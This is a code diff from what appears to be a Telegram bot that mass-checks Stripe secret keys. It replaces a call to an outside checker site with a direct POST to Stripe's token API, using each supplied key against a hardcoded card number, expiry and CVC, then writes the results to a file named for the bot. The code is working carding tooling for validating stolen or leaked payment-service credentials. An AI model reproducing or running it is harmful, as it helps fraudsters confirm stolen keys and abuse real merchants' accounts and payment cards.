@@ -70,7 +70,20 @@ Your Account Is GOLD But You Have Check More Than 1K SK!
                 else:
                     await message.reply_text(ms_)
                     for site in domains:
-                        response = s.get(f'https://rembleampi.site/api/masssk.php?sk={site}').text
+                        url = 'https://api.stripe.com/v1/tokens'
+                        data = {
+                            'card[number]': '4580420266153881',
+                            'card[exp_month]': '09',
+                            'card[exp_year]': '2025',
+                            'card[cvc]': '704',
+                            }
+                        headers = {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        }
+                        auth = (site, '')
+                        resp = requests.post(url, data=data, headers=headers, auth=auth)
+                        resp1 = Getstr(resp.text, '"message": "', '"')
+                        response = f'{resp1} - {site}'
                         sk_list.append(response)
                     with open(f'{x}x_SK_CHK_BY_@JoannaChkBot.txt', 'a+') as f:
                                 f.write('\n'.join(sk_list))
